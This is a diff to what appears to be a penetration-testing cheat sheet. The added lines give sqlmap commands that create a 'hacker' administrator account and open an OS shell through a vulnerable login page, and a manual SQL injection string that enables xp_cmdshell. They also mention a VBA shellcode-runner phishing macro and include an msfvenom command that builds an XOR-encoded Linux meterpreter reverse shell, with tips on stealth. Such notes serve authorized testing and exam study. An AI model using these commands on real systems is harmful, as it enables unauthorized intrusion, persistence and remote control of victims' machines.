@@ -81,7 +81,13 @@ sqlmap -u "http://<victim ip>/login.asp?user=a&password=a" --os-cmd="net user ha
 sqlmap -u "http://<victim ip>/login.asp?user=a&password=a" --os-cmd="net localgroup administrators hacker /add"
 # try to get shell
 sqlmap -u "http://<victim ip>/login.asp?user=a&password=a" --os-shell
+# if above does not work, try sql shell and then enable xp_cmdshell. Can also consider uploading a malicious asp file to web root and execute
+sqlmap -u "http://<victim ip>/login.asp?user=a&password=a" --sql-shell
+
+## manual SQL Injection in BurpSuite; note you may need to use + or %20 for the whitespaces
+http://192.168.X.X/login.asp?user=test&pass=1' or 1=1;EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE--
 ```
+- Note if there is SQL vuln, that means there is an SQL database somewhere (most likely MSSQL)
 
 
 ### Email Phishing Vector
@@ -120,4 +126,10 @@ End Sub
 - Can consider a direct VBA Shellcode Runner (obfuscated shellcode) of course
 - if not, you can use get the VBA to download your compiled executable and execute it with InstalUtil
 
+### ELF File Upload
 
+- Linux boxes are usually simpler. Try the following payload
+- Prependfork=true spawns a child process before executing the malcode which is stealthier and is more stable as the parent process wont crash or have malcode running in it
+```bash
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 prependfork=true -f elf -t 300 -e x64/xor_dynamic -o test.elf
+```
